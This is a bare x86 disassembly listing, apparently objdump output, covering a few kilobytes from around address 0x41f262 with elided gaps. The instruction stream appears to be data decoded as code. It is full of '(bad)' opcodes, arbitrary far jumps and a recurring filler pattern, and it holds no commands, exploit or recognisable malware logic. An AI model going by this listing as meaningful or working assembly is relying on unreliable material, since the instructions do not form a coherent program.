  41f262:	xchg   esi,eax
  41f263:	mov    ebp,0x42ea6862
  41f268:	mov    edi,0x704c80d5
  41f26d:	rcr    DWORD PTR [eax],1
  41f26f:	jno    0x41f2c7
  41f271:	and    BYTE PTR [edx+0x2925f0e6],cl
  41f277:	dec    ebx
  41f278:	out    0x2,al
  41f27a:	(bad)  
  41f27b:	arpl   WORD PTR ss:[esi+0x7e],bp
  41f27f:	sub    edi,DWORD PTR [esi-0x35]
  41f282:	inc    ebx
  41f283:	push   0xffffffa5
  41f285:	mov    dh,0x70
  41f287:	data16 jbe 0x41f2df
  41f28a:	or     eax,0xf28e7667
  41f28f:	pop    edx
  41f290:	xchg   DWORD PTR [eax],eax
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2a7
  41f301:	xor    DWORD PTR [ebx+ecx*4],ebx
  41f304:	xor    al,0x4c
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x96000001
  41f30d:	sub    BYTE PTR [edi-0x1dcaab1a],ch
  41f313:	rcl    BYTE PTR ds:0x1cfb3e25,0x16
  41f31a:	jmp    FWORD PTR [eax-0x1e2ffc71]
  41f320:	neg    DWORD PTR [edi]
  41f322:	mov    ebx,0x1d24421e
  41f327:	scas   al,BYTE PTR es:[edi]
  41f328:	sahf   
  41f329:	frstor [ecx+0x5492ded4]
  41f32f:	loop   0x41f388
  41f331:	mov    bl,0xe1
  41f333:	or     dl,al
  41f335:	or     BYTE PTR [edi+0x3b],0xa0
  41f339:	pop    ds
  41f33a:	push   0x61
  41f33c:	in     al,dx
  41f33d:	mov    eax,ds:0x814886ce
  41f342:	sub    eax,0xef71816a
  41f347:	sub    BYTE PTR [edx-0x27],bl
  41f34a:	(bad)  
  41f34c:	ret    
  41f34d:	cs jne 0x41f303
  41f350:	pop    esp
  41f351:	push   ds
  41f352:	sub    eax,0xb965aa5f
  41f357:	mov    ah,0x9e
  41f359:	fdiv   DWORD PTR ds:0x4d1f3f3b
  41f35f:	enter  0xacdb,0x65
  41f363:	mov    al,0x3f
  41f365:	call   0xcf1c:0xa301c330
  41f36c:	or     ebp,DWORD PTR [edx+0x2e]
  41f36f:	fmulp  st(5),st
  41f371:	or     al,BYTE PTR [ecx-0x2f]
  41f374:	int3   
  41f375:	stos   BYTE PTR es:[edi],al
  41f376:	pop    edi
  41f377:	or     eax,0x677214ef
  41f37c:	push   ds
  41f37d:	xchg   ebp,eax
  41f37e:	dec    eax
  41f37f:	mov    dl,0x4f
  41f381:	xchg   esp,esp
  41f383:	jo     0x41f33a
  41f385:	leave  
  41f386:	(bad)  
  41f387:	in     al,dx
  41f388:	jne    0x41f409
  41f38a:	cmp    dh,ch
  41f38c:	inc    esi
  41f38d:	test   BYTE PTR [edx+0x63f80f8a],ch
  41f393:	rcl    DWORD PTR [esi-0x8],0xec
  41f397:	das    
  41f398:	xchg   edi,eax
  41f399:	cs scas al,BYTE PTR es:[edi]
  41f39b:	gs (bad) 
  41f39e:	jno    0x41f39b
  41f3a0:	pop    bx
  41f3a2:	dec    esi
  41f3a3:	stc    
  41f3a4:	stc    
  41f3a5:	add    eax,0x73976788
  41f3aa:	ror    DWORD PTR [eax+0x63],0x51
  41f3ae:	mov    dl,0xe0
  41f3b0:	neg    DWORD PTR [esi-0x71]
  41f3b3:	(bad)  
  41f3b4:	mul    DWORD PTR [edx-0x2c]
  41f3b7:	(bad)  
  41f3b8:	sti    
  41f3b9:	test   eax,0x7a8b7716
  41f3be:	mov    DWORD PTR [esi+0x390dfcb],esi
  41f3c4:	sub    eax,0xd96ce573
  41f3c9:	jecxz  0x41f366
  41f3cb:	stos   DWORD PTR es:[edi],eax
  41f3cc:	(bad)  
  41f3cd:	xor    eax,0x8cb0fc30
  41f3d2:	pop    ecx
  41f3d3:	dec    esi
  41f3d4:	sar    DWORD PTR [eax+0x29a586dd],0x9d
  41f3db:	push   edx
  41f3dc:	mul    DWORD PTR [edi+eiz*4]
  41f3df:	add    ecx,DWORD PTR [ebx+0x73e86b61]
  41f3e5:	and    BYTE PTR [edi],bl
  41f3e7:	mov    ch,0x38
  41f3e9:	(bad)  
  41f3ea:	retf   
  41f3eb:	mov    esp,0xb8e37852
  41f3f0:	push   ds
  41f3f1:	ja     0x41f446
  41f3f3:	shl    BYTE PTR [ebp+0x24],0x8e
  41f3f7:	imul   edi,DWORD PTR [ebx],0xe
  41f3fa:	stos   BYTE PTR es:[edi],al
  41f3fb:	pop    edi
  41f3fc:	sub    ebp,DWORD PTR [edi+0x15]
  41f3ff:	test   cl,dl
  41f401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f402:	imul   edi,DWORD PTR [esi],0x9ac0a891
  41f408:	js     0x41f3a9
  41f40a:	stos   DWORD PTR es:[edi],eax
  41f40b:	mov    esi,0x8e698a13
  41f410:	sbb    al,BYTE PTR [eax]
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xfe
  41f481:	vrcp14sd xmm0{k1},xmm3,(bad)
  41f482:	ret    0x39a5
  41f485:	dec    ebp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    eax,0x8a000001
  41f48d:	adc    eax,0x13237c42
  41f492:	outs   dx,DWORD PTR ds:[esi]
  41f493:	add    al,0xe2
  41f495:	cdq    
  41f496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f497:	pop    es
  41f498:	pop    ebp
  41f499:	xchg   ebx,eax
  41f49a:	fisttp QWORD PTR [edx-0x7ba6c910]
  41f4a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4a1:	dec    eax
  41f4a2:	mov    al,0x1
  41f4a4:	dec    BYTE PTR [eax]
  41f4a6:	jbe    0x41f51c
  41f4a8:	pop    edx
  41f4a9:	pop    ebp
  41f4aa:	fidiv  WORD PTR [eax-0x7b]
  41f4ad:	push   esi
  41f4ae:	mov    eax,0x959dfce5
  41f4b3:	out    0xfa,al
  41f4b5:	lds    ebx,FWORD PTR [edx]
  41f4b7:	or     BYTE PTR [edi-0x63],0xb
  41f4bb:	xchg   esi,eax
  41f4bc:	ins    BYTE PTR es:[edi],dx
  41f4bd:	cmp    al,0x91
  41f4bf:	or     DWORD PTR [edx+eax*4-0x74],ebp
  41f4c3:	push   0xc2de54b
  41f4c8:	xchg   ebx,eax
  41f4c9:	loopne 0x41f4b9
  41f4cb:	jnp    0x41f462
  41f4cd:	adc    ch,BYTE PTR [edx]
  41f4cf:	mov    esp,0x938189ad
  41f4d4:	jle    0x41f525
  41f4d6:	lods   al,BYTE PTR ds:[esi]
  41f4d7:	fwait
  41f4d8:	adc    al,0xb2
  41f4da:	push   edi
  41f4db:	sahf   
  41f4dc:	cwde   
  41f4dd:	push   esp
  41f4de:	stc    
  41f4df:	sub    ebx,DWORD PTR [ebp+0x6b9f5072]
  41f4e5:	leave  
  41f4e6:	xchg   ecx,eax
  41f4e7:	push   esp
  41f4e8:	xchg   ebp,eax
  41f4e9:	or     eax,0xb8d2e5a4
  41f4ee:	sbb    bl,BYTE PTR [eax-0x1aa18e89]
  41f4f4:	jp     0x41f56d
  41f4f6:	sub    BYTE PTR [ecx-0x60bcb8d4],bh
  41f4fc:	mov    esp,0x9e927371
  41f501:	outs   dx,BYTE PTR ds:[esi]
  41f502:	or     DWORD PTR [ebx],edi
  41f504:	pop    esi
  41f505:	fild   DWORD PTR [edx-0x31837225]
  41f50b:	cmp    bl,BYTE PTR [esi]
  41f50d:	pusha  
  41f50e:	xchg   edx,eax
  41f50f:	cmp    dh,al
  41f511:	jg     0x41f56a
  41f513:	jb     0x41f523
  41f515:	ret    0x5638
  41f518:	mov    edx,0x65bf4357
  41f51d:	xor    ah,BYTE PTR [eax-0x10]
  41f520:	ss call 0x87f:0x524b16e8
  41f528:	or     bh,BYTE PTR [ebx+edx*2+0x19fd6c03]
  41f52f:	aaa    
  41f530:	out    dx,eax
  41f531:	ror    esi,cl
  41f533:	data16 lahf 
  41f535:	jg     0x41f574
  41f537:	sub    eax,0xa8928c6
  41f53c:	push   ds
  41f53d:	xor    DWORD PTR [esp+esi*2],0xcd4d63cc
  41f544:	xlat   BYTE PTR ds:[ebx]
  41f545:	push   0xffffffa5
  41f547:	repnz addr16 ror al,1
  41f54b:	fisttp QWORD PTR [ecx-0x34]
  41f54e:	or     DWORD PTR [eax-0x429f8a7a],0xffffff85
  41f555:	push   ebx
  41f556:	push   eax
  41f557:	mov    gs:0x1fbb5aad,eax
  41f55d:	push   0x383e1848
  41f562:	lock dec eax
  41f564:	aaa    
  41f565:	push   0xfffffff2
  41f567:	fxch   st(3)
  41f569:	call   0x7f2:0x4a66241e
  41f570:	fimul  WORD PTR [esi+ecx*4-0x63]
  41f574:	gs stos DWORD PTR es:[edi],eax
  41f576:	push   edi
  41f577:	xchg   ebx,eax
  41f578:	mov    ah,BYTE PTR [ecx-0x1b]
  41f57b:	jle    0x41f5aa
  41f57d:	cmp    ebx,edx
  41f57f:	cmp    eax,0x7946b4cb
  41f584:	jae    0x41f5c1
  41f586:	adc    ch,bh
  41f588:	dec    edi
  41f589:	mov    DWORD PTR [eax-0x3a],esp
  41f58c:	out    dx,al
  41f58d:	jo     0x41f5c6
  41f58f:	(bad)  
  41f590:	jmp    0x41f592
	...
  41f5f2:	add    BYTE PTR [eax],al
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x6efd:0xaecdd422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x64000001
  41f60d:	xor    DWORD PTR [ebp+0x3417bece],0x37e13ffd
  41f617:	iret   
  41f618:	icebp  
  41f619:	pop    ds
  41f61a:	mov    ah,bl
  41f61c:	jg     0x41f661
  41f61e:	out    0x2a,eax
  41f620:	imul   ebp,DWORD PTR [edi+0x448c9664],0x9f25298
  41f62a:	into   
  41f62b:	fstp   DWORD PTR [edx+0x1a98eea6]
  41f631:	mov    bh,0x2e
  41f633:	cmp    al,0x55
  41f635:	xor    DWORD PTR [edi-0x5cbcaebd],ecx
  41f63b:	in     eax,0xef
  41f63d:	popa   
  41f63e:	inc    edx
  41f63f:	or     cl,BYTE PTR [edi-0x2a]
  41f642:	mov    eax,0x827354ea
  41f647:	cmp    dh,dl
  41f649:	mov    al,0x80
  41f64b:	and    al,0x81
  41f64d:	jecxz  0x41f664
  41f64f:	pushf  
  41f650:	jnp    0x41f637
  41f652:	dec    esp
  41f653:	xor    DWORD PTR [esp+esi*8+0x18],edx
  41f657:	push   0xa6c9eac1
  41f65c:	addr16 je 0x41f6c5
  41f65f:	in     eax,0x37
  41f661:	pushf  
  41f662:	pop    eax
  41f663:	lods   al,BYTE PTR ds:[esi]
  41f664:	std    
  41f665:	xor    al,0x1a
  41f667:	xor    ah,BYTE PTR [eax+0x393a5ba5]
  41f66d:	aam    0x43
  41f66f:	ins    DWORD PTR es:[edi],dx
  41f670:	int    0x60
  41f672:	add    al,0x30
  41f674:	outs   dx,DWORD PTR ds:[esi]
  41f675:	add    eax,0x3d39cc9c
  41f67a:	sub    eax,0xdcc3197c
  41f67f:	mov    BYTE PTR [ecx*2-0x421253c8],dh
  41f686:	ds inc esi
  41f688:	inc    edx
  41f689:	in     al,dx
  41f68a:	stos   DWORD PTR es:[edi],eax
  41f68b:	lock push ecx
  41f68d:	hlt    
  41f68e:	jne    0x41f69f
  41f690:	adc    al,0x3a
  41f692:	adc    DWORD PTR [ecx-0x4937a185],ebp
  41f698:	lods   al,BYTE PTR ds:[esi]
  41f699:	ins    DWORD PTR es:[edi],dx
  41f69a:	or     bl,BYTE PTR [esi]
  41f69c:	shr    BYTE PTR [ebx+ebp*8-0x34534295],0x4e
  41f6a4:	mov    BYTE PTR [esi],0x4
  41f6a7:	mov    ebx,DWORD PTR [edx]
  41f6a9:	ret    
  41f6aa:	std    
  41f6ab:	ins    DWORD PTR es:[edi],dx
  41f6ac:	outs   dx,BYTE PTR ds:[esi]
  41f6ad:	and    eax,0xb7649897
  41f6b2:	cmc    
  41f6b3:	(bad)  [ebx+0x65f425e2]
  41f6b9:	in     al,dx
  41f6ba:	jge    0x41f66b
  41f6bc:	mov    ebp,0x39d27fc2
  41f6c1:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41f6c3:	push   edx
  41f6c4:	repz (bad) [edi+0x131d1d35]
  41f6cb:	or     ch,dl
  41f6cd:	mov    bh,0x9b
  41f6cf:	jo     0x41f6b0
  41f6d1:	cmp    bl,BYTE PTR [esi-0x1c74eacf]
  41f6d7:	fistp  DWORD PTR [ebx-0x572aafb1]
  41f6dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6de:	xchg   BYTE PTR [edx+edx*2],bl
  41f6e1:	pushf  
  41f6e2:	mov    al,ds:0xf79f96f1
  41f6e7:	jge    0x41f69b
  41f6e9:	add    DWORD PTR [esi-0x1f],ecx
  41f6ec:	je     0x41f680
  41f6ee:	outs   dx,DWORD PTR ds:[esi]
  41f6ef:	out    dx,eax
  41f6f0:	leave  
  41f6f1:	and    DWORD PTR [edx-0x75a5407f],edi
  41f6f7:	lock mov esp,0x457c9e8f
  41f6fd:	xchg   al,al
  41f6ff:	mov    al,0xcc
  41f701:	test   DWORD PTR [esi-0x5049f998],eax
  41f707:	clc    
  41f708:	add    eax,DWORD PTR [ebx+0x45f88f12]
  41f70e:	ins    BYTE PTR es:[edi],dx
  41f70f:	jg     0x41f72e
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xdea4:0x736c62d2
  41f783:	into   
  41f784:	inc    ebx
  41f785:	dec    edi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0x80000001
  41f78d:	sti    
  41f78e:	jno    0x41f715
  41f790:	je     0x41f7b8
  41f792:	clc    
  41f793:	mov    edx,0x3f06dc7e
  41f798:	gs mov ch,0x1b
  41f79b:	pop    edi
  41f79c:	and    esp,esi
  41f79e:	nop
  41f79f:	mov    cl,0xcf
  41f7a1:	lods   al,BYTE PTR ds:[esi]
  41f7a2:	add    bh,ch
  41f7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7a5:	jno    0x41f78e
  41f7a7:	jmp    0xe69f:0x3160f31d
  41f7ae:	loope  0x41f77b
  41f7b0:	(bad)  
  41f7b1:	into   
  41f7b2:	enter  0x8baf,0x5a
  41f7b6:	fs stos DWORD PTR es:[edi],eax
  41f7b8:	out    dx,al
  41f7b9:	jns    0x41f7f8
  41f7bb:	adc    DWORD PTR [ecx-0x7b],ecx
  41f7be:	mov    eax,0xdfcd46b3
  41f7c3:	or     DWORD PTR [ebp+ebx*8+0x690cbb8d],ecx
  41f7ca:	(bad)  
  41f7cc:	adc    al,0x93
  41f7ce:	xchg   esi,eax
  41f7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7d0:	rcr    BYTE PTR [edx-0x1f],1
  41f7d3:	xchg   ebp,eax
  41f7d4:	rcl    ebx,1
  41f7d6:	stc    
  41f7d7:	adc    DWORD PTR [edi],edx
  41f7d9:	test   al,0x95
  41f7db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7dc:	push   ebp
  41f7dd:	rcr    BYTE PTR [ebp+ecx*4+0x5f],0x29
  41f7e2:	jg     0x41f85b
  41f7e4:	inc    ecx
  41f7e5:	idiv   DWORD PTR [esp+ebx*2]
  41f7e8:	pop    es
  41f7e9:	leave  
  41f7ea:	jb     0x41f770
  41f7ec:	push   esi
  41f7ed:	push   ebx
  41f7ee:	mov    cl,0xe1
  41f7f0:	mov    ch,bh
  41f7f2:	outs   dx,DWORD PTR ds:[esi]
  41f7f3:	pop    eax
  41f7f4:	adc    eax,0xb5f21854
  41f7f9:	and    edi,ebp
  41f7fb:	(bad)  [ecx+eax*2]
  41f7fe:	jmp    0x8c09:0x4688d0a5
  41f805:	push   edx
  41f806:	and    dl,BYTE PTR [ebp-0x7a87dea6]
  41f80c:	mov    BYTE PTR [esi],dl
  41f80e:	leave  
  41f80f:	push   ss
  41f810:	mov    ebx,0x4edd116a
  41f815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f816:	into   
  41f817:	jmp    0x295d:0x3c677067
  41f81e:	xchg   ebx,eax
  41f81f:	mov    edi,0x905b487c
  41f824:	pop    esp
  41f825:	dec    esp
  41f826:	mov    esp,0x3f263d7b
  41f82b:	jle    0x41f83e
  41f82d:	(bad)  
  41f82e:	sar    BYTE PTR [ecx-0x5ae3fd04],cl
  41f834:	in     al,dx
  41f835:	je     0x41f7da
  41f837:	mov    ah,0x1a
  41f839:	imul   eax,DWORD PTR [eax+0xf],0x2922f3cd
  41f840:	loope  0x41f859
  41f842:	adc    BYTE PTR [edi],ch
  41f844:	jecxz  0x41f7f2
  41f846:	lods   al,BYTE PTR ds:[esi]
  41f847:	loop   0x41f8ab
  41f849:	int    0xea
  41f84b:	sub    ebx,DWORD PTR [ebx+0x2173276d]
  41f851:	dec    ecx
  41f852:	sahf   
  41f853:	dec    edx
  41f854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f855:	sti    
  41f856:	jae    0x41f83d
  41f858:	test   eax,0x3d096874
  41f85d:	dec    eax
  41f85e:	repz addr16 jnp 0x41f816
  41f862:	cmp    dl,BYTE PTR [eax+0x6366406]
  41f868:	pop    edx
  41f869:	int3   
  41f86a:	(bad)  
  41f86b:	pusha  
  41f86c:	in     al,dx
  41f86d:	rol    esp,0x56
  41f870:	push   ebp
  41f871:	dec    ebx
  41f872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f873:	mov    dh,BYTE PTR [edi]
  41f875:	fadd   QWORD PTR [ebx+0x59b12e64]
  41f87b:	js     0x41f846
  41f87d:	loop   0x41f802
  41f87f:	xchg   ebp,eax
  41f880:	stos   BYTE PTR es:[edi],al
  41f881:	mov    ebp,0x6dd8dd31
  41f886:	mov    eax,0x75254929
  41f88b:	icebp  
  41f88c:	pop    eax
  41f88d:	std    
  41f88e:	or     BYTE PTR ds:0x3d,al
	...
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	or     dh,ah
  41f902:	hlt    
  41f903:	fmul   QWORD PTR [eax+0x50]
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0x2f000001
  41f90d:	bound  ecx,QWORD PTR [ebp-0x1fc63adb]
  41f913:	clc    
  41f914:	add    eax,0x422d15d3
  41f919:	mov    esi,0xcae41eb1
  41f91e:	inc    eax
  41f91f:	loop   0x41f956
  41f921:	mov    bh,0x72
  41f923:	mov    dl,0x5c
  41f925:	sub    DWORD PTR ds:[ebp-0xc88441f],ecx
  41f92c:	cmp    dh,0xf0
  41f92f:	test   BYTE PTR [edx],0x48
  41f932:	sbb    edi,esi
  41f934:	in     al,dx
  41f935:	arpl   WORD PTR [eax],dx
  41f937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f938:	mov    al,0x8f
  41f93a:	(bad)  
  41f93b:	daa    
  41f93c:	nop
  41f93d:	repnz dec edi
  41f93f:	out    0x92,eax
  41f941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f942:	jle    0x41f955
  41f944:	retf   0x8b57
  41f947:	pusha  
  41f948:	(bad)  
  41f949:	rcr    esi,1
  41f94b:	sub    dl,BYTE PTR [esi]
  41f94d:	in     eax,0x43
  41f94f:	dec    esp
  41f950:	or     al,BYTE PTR [edx+0x49c4f09d]
  41f956:	imul   esp,DWORD PTR ds:0x1a50e39d,0xeb82ea44
  41f960:	popf   
  41f961:	test   BYTE PTR [ebx],ah
  41f963:	pop    ebp
  41f964:	pop    es
  41f965:	jecxz  0x41f995
  41f967:	adc    edx,esi
  41f969:	xchg   DWORD PTR [esi+0x2c8493fb],edx
  41f96f:	dec    ebx
  41f970:	pusha  
  41f971:	(bad)  
  41f973:	pop    ebx
  41f974:	xchg   ebx,eax
  41f975:	sbb    al,0xb8
  41f977:	mov    al,0xa5
  41f979:	lock mov ch,BYTE PTR [esi-0x2ac562c2]
  41f980:	sbb    DWORD PTR [edx],ecx
  41f982:	mov    ah,0xc
  41f984:	imul   eax,DWORD PTR [eax-0x533d63f1],0xffffffe9
  41f98b:	mov    ?,WORD PTR [eax+0x11]
  41f98e:	pop    ecx
  41f98f:	pop    edi
  41f990:	push   ebx
  41f991:	retf   
  41f992:	aam    0x12
  41f994:	aaa    
  41f995:	mov    ebx,0x6f963085
  41f99a:	mov    edx,0x8e7d8818
  41f99f:	test   DWORD PTR [eax+0x29],ecx
  41f9a2:	push   ss
  41f9a3:	ret    0xce39
  41f9a6:	sbb    BYTE PTR [edi+0x6fac1781],bh
  41f9ac:	in     al,dx
  41f9ad:	sti    
  41f9ae:	adc    BYTE PTR [eax+0x5a],bl
  41f9b1:	data16 mov WORD PTR [esp+ebp*1-0x7e91fdce],ds
  41f9b9:	frstor [ebp-0x50565e19]
  41f9bf:	inc    eax
  41f9c0:	psllw  mm2,QWORD PTR [ecx-0x1d]
  41f9c4:	xchg   edx,eax
  41f9c5:	std    
  41f9c6:	adc    DWORD PTR ds:0x5a40be14,edi
  41f9cc:	(bad)  
  41f9cd:	pop    ecx
  41f9ce:	nop
  41f9cf:	and    DWORD PTR [ebx+0x48d25c19],0xc31fff3f
  41f9d9:	adc    ecx,DWORD PTR [eax]
  41f9db:	ror    DWORD PTR [edx-0x697d4e31],cl
  41f9e1:	fimul  WORD PTR [eax]
  41f9e3:	lea    eax,[edx]
  41f9e5:	ja     0x41fa4e
  41f9e7:	mov    BYTE PTR [edx-0x1a],ah
  41f9ea:	jno    0x41fa59
  41f9ec:	adc    BYTE PTR [edi],bh
  41f9ee:	inc    edi
  41f9ef:	fdivr  DWORD PTR [ecx+0x50]
  41f9f2:	dec    ecx
  41f9f3:	clc    
  41f9f4:	xor    eax,esp
  41f9f6:	sbb    eax,0xd70fa8ca
  41f9fb:	repz imul esi,ebp,0xada1ddfe
  41fa02:	or     al,0x65
  41fa04:	mov    ecx,0x5ced43c0
  41fa09:	fld    DWORD PTR [eax+0x6b8b818b]
  41fa0f:	jle    0x41fa84
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0x7ceab15,eax
  41fa83:	sbb    al,0x4d
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0xb8000001
  41fa8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa8e:	pop    ds
  41fa8f:	iret   
  41fa90:	fstp   TBYTE PTR [edi+edi*8]
  41fa93:	push   esp
  41fa94:	jne    0x41fabc
  41fa96:	sbb    esp,DWORD PTR [ecx-0x34c67dd0]
  41fa9c:	sti    
  41fa9d:	jmp    0x41fa8c
  41fa9f:	jmp    0xc600e528
  41faa4:	retf   
  41faa5:	dec    edi
  41faa6:	loopne 0x41faef
  41faa8:	aam    0x30
  41faaa:	inc    edx
  41faab:	clc    
  41faac:	adc    bh,bh
  41faae:	out    0x30,al
  41fab0:	je     0x41fade
  41fab2:	mov    eax,0x8322ea93
  41fab7:	rcl    ch,cl
  41fab9:	pop    esp
  41faba:	mov    eax,0x17c8293a
  41fabf:	and    dl,dh
  41fac1:	or     dl,al
  41fac3:	mov    ebx,0x3df08948
  41fac8:	and    BYTE PTR [ebx-0x684560b5],0x6f
  41facf:	lds    esi,FWORD PTR ss:[ecx]
  41fad2:	jp     0x41fb08
  41fad4:	repz dec esp
  41fad6:	pop    ebp
  41fad7:	and    BYTE PTR [eax],dh
  41fad9:	push   edx
  41fada:	jb     0x41fb25
  41fadc:	(bad)  
  41fadd:	ins    BYTE PTR es:[edi],dx
  41fade:	add    DWORD PTR [eax-0x7e11cc83],0x45
  41fae5:	pop    ecx
  41fae6:	test   eax,0x1a0a13a2
  41faeb:	add    dl,BYTE PTR [esi+eax*4+0x5e]
  41faef:	add    al,0x3
  41faf1:	mov    ebp,ss
  41faf3:	aaa    
  41faf4:	scas   al,BYTE PTR es:[edi]
  41faf5:	pop    ebp
  41faf6:	add    edx,DWORD PTR [edx]
  41faf8:	xchg   edi,eax
  41faf9:	dec    edi
  41fafa:	cmp    eax,0xa98b081e
  41faff:	ret    0xb164
  41fb02:	inc    edi
  41fb03:	aas    
  41fb04:	idiv   BYTE PTR [ebp-0x4bfdd1a0]
  41fb0a:	push   ecx
  41fb0b:	and    BYTE PTR [ecx],cl
  41fb0d:	std    
  41fb0e:	cs xchg esp,eax
  41fb10:	inc    ebp
  41fb11:	add    edx,esi
  41fb13:	xchg   bl,dl
  41fb15:	or     al,0x8a
  41fb17:	cmp    DWORD PTR [edi+edi*8+0x28ecd9e1],edx
  41fb1e:	dec    eax
  41fb1f:	imul   DWORD PTR [esi]
  41fb21:	hlt    
  41fb22:	cmp    BYTE PTR es:[eax-0x48],0x87
  41fb27:	and    eax,0xce46f4ee
  41fb2c:	xor    dh,BYTE PTR [edx+0x725e2334]
  41fb32:	cmp    al,0xf3
  41fb34:	mov    ds:0x5fc7e678,al
  41fb39:	stc    
  41fb3a:	jnp    0x41faed
  41fb3c:	dec    ebp
  41fb3d:	xlat   BYTE PTR ds:[ebx]
  41fb3e:	dec    esp
  41fb3f:	add    al,0x8b
  41fb41:	pop    esi
  41fb42:	aas    
  41fb43:	fldenv [ebp-0x2bf4a5f8]
  41fb49:	shl    BYTE PTR [ebx-0x21d47136],1
  41fb4f:	mov    bl,BYTE PTR [edi+0x6ebe101b]
  41fb55:	mov    ch,BYTE PTR [edx+ebx*8]
  41fb58:	out    0xd4,eax
  41fb5a:	in     al,dx
  41fb5b:	adc    edi,edx
  41fb5d:	(bad)  
  41fb5e:	mov    WORD PTR [ebx-0x3acf68da],ds
  41fb64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb65:	cmp    BYTE PTR [edi+0x6c03920a],al
  41fb6b:	sbb    edx,DWORD PTR [ebx-0x39]
  41fb6e:	mov    bh,0xbc
  41fb70:	leave  
  41fb71:	cmp    ecx,DWORD PTR [esi+edx*1-0x1e29b244]
  41fb78:	adc    al,bh
  41fb7a:	ds jne 0x41fb57
  41fb7d:	pop    ss
  41fb7e:	fwait
  41fb7f:	cmp    BYTE PTR [edx],ch
  41fb81:	jbe    0x41fb8c
  41fb83:	ds xchg ecx,eax
  41fb85:	test   eax,0x78cc3827
  41fb8a:	xchg   ebx,eax
  41fb8b:	(bad)  
  41fb8d:	(bad)
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	sbb    al,0x49
  41fc02:	or     eax,0x15252a3
  41fc07:	add    BYTE PTR ds:0xbe000001,al
  41fc0d:	mov    bl,0x33
  41fc0f:	sub    al,BYTE PTR [eax+eiz*4]
  41fc12:	mov    cl,0xe0
  41fc14:	fisttp QWORD PTR [eax-0x4c]
  41fc17:	sub    edx,DWORD PTR [edi]
  41fc19:	mov    edx,0xa0139f66
  41fc1e:	add    BYTE PTR [edi-0x168ba3a0],ah
  41fc24:	inc    eax
  41fc25:	xchg   esp,eax
  41fc26:	inc    esi
  41fc27:	pusha  
  41fc28:	shl    BYTE PTR [edx-0x6],0x66
  41fc2c:	imul   esi,DWORD PTR [ebx],0x7d
  41fc2f:	fst    DWORD PTR [eax+0x5a]
  41fc32:	idiv   BYTE PTR [edx+0x18]
  41fc35:	sub    DWORD PTR [edi+ebp*4],esp
  41fc38:	lds    ecx,FWORD PTR ds:[eax-0x18427a05]
  41fc3f:	out    0x39,al
  41fc41:	and    eax,0xe19f8559
  41fc46:	cmp    DWORD PTR [ebx-0x14],edx
  41fc49:	jb     0x41fc8f
  41fc4b:	in     eax,dx
  41fc4c:	mov    dh,0x4e
  41fc4e:	or     esp,edx
  41fc50:	mov    ebp,0x16a29799
  41fc55:	out    0x5d,al
  41fc57:	and    DWORD PTR [esi+0x5a],edi
  41fc5a:	pop    es
  41fc5b:	fadd   QWORD PTR [eax-0x3f]
  41fc5e:	outs   dx,BYTE PTR ds:[esi]
  41fc5f:	xchg   ebp,eax
  41fc60:	fbld   TBYTE PTR [ebx-0x48fd09e]
  41fc66:	mov    ebx,0x771d2182
  41fc6b:	push   ss
  41fc6c:	and    DWORD PTR [esi-0x4d],edx
  41fc6f:	or     ch,cl
  41fc71:	cdq    
  41fc72:	test   al,0xf0
  41fc74:	lea    ebp,[esi]
  41fc76:	add    bl,ch
  41fc78:	mov    bh,0xbc
  41fc7a:	xor    DWORD PTR [ebx+ecx*4+0x63],eax
  41fc7e:	out    dx,eax
  41fc7f:	dec    edx
  41fc80:	gs (bad) 
  41fc82:	mov    edi,0xe60f2b93
